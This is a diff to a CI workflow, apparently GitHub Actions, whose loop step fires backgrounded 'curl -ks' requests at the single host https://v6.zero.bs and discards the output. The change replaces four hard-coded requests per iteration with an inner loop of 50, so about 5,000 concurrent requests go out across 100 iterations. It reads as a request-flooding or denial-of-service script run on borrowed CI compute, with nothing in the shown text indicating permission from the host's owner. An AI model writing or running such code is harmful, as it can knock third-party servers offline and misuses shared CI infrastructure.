@@ -27,13 +27,15 @@ jobs:
         id: loop_step
         run: |
           counter=0
+          max_loops=50
           while [ $counter -lt 100 ]; do
             echo "Running loop iteration $((counter + 1))..."
-            # Add your desired actions here for each iteration
-            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
-            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
-            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
-            curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+            curl_loop=0
+            while [ $curl_loop -lt $max_loops ]; do
+              curl -ks https://v6.zero.bs 2>&1 > /dev/null &
+              curl_loop=$((curl_loop + 1))
+            done
+            echo " [+] started $max_loops processes "
             curl -ks https://v6.zero.bs 2>&1 > /dev/null
             
             counter=$((counter + 1))
